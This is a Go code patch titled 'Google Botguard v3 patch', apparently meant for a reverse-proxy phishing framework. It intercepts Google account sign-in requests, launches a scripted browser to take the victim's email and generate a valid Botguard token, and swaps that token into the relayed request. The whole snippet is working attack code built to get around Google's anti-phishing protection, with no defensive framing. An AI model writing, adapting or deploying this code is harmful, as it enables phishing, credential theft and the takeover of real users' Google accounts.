// Google Botguard v3 patch
//line 900, after force_post
if strings.EqualFold(req.Host, "accounts.google.com") && strings.Contains(req.URL.String(), "/v3/signin/_/AccountsSignInUi/data/batchexecute?") && strings.Contains(req.URL.String(), "rpcids=V1UmUe") {
	log.Debug("GoogleBypass working with: %v", req.RequestURI)
	decodedBody, err := url.QueryUnescape(string(body))
	if err != nil {
		log.Error("Failed to decode body: %v", err)
	}
	decodedBodyBytes := []byte(decodedBody)
	b := &GoogleBypasser{
		isHeadless:     false,
		withDevTools:   false,
		slowMotionTime: 1500 * time.Millisecond,
	}
	b.Launch()
	b.GetEmail(decodedBodyBytes)
	b.GetToken()
	decodedBodyBytes = b.ReplaceTokenInBody(decodedBodyBytes)
	postForm, err := url.ParseQuery(string(decodedBodyBytes))
	if err != nil {
		log.Error("Failed to parse form data: %v", err)
	}
	body = []byte(postForm.Encode())
	req.ContentLength = int64(len(body))
}
req.Body = io.NopCloser(bytes.NewBuffer(body)) // Updated for Go 1.17+